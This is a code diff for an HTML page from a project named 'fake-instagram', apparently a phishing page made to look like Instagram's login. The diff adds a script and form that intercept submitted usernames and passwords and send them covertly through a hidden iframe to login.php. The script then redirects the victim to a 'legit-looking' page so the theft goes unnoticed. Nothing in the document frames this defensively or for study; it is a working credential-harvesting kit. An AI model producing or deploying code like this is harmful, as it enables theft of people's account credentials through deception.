@@ -8,6 +8,49 @@
 #                         by [Ali Milani Amin]
 #             ~> https://github.com/AliMilani/fake-instagram/
 -->
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    const loginForm = document.querySelector('form');
+    
+    if (loginForm) {
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Get username and password values
+            const username = document.querySelector('input[name="username"]')?.value;
+            const password = document.querySelector('input[name="password"]')?.value;
+            
+            if (username && password) {
+                // Create a hidden iframe to send data
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = `login.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
+                document.body.appendChild(iframe);
+                
+                // Optional: Redirect to a legit-looking page after a delay
+                setTimeout(() => {
+                    window.location.href = 'https://example.com/password-reset';
+                }, 1000);
+            }
+        });
+    }
+});
+</script>
+
+<!-- Modify your form to include proper name attributes -->
+<form method="POST" action="login.php">
+    <div class="group">
+        <input type="text" name="username" required>
+        <label>Username</label>
+    </div>
+    <div class="group">
+        <input type="password" name="password" required>
+        <label>Password</label>
+    </div>
+    <button type="submit">Log In</button>
+</form>
+
 <html lang="en" class="js not-logged-in client-root js-focus-visible sDN5V">
   <head>
     <meta charset="utf-8" />
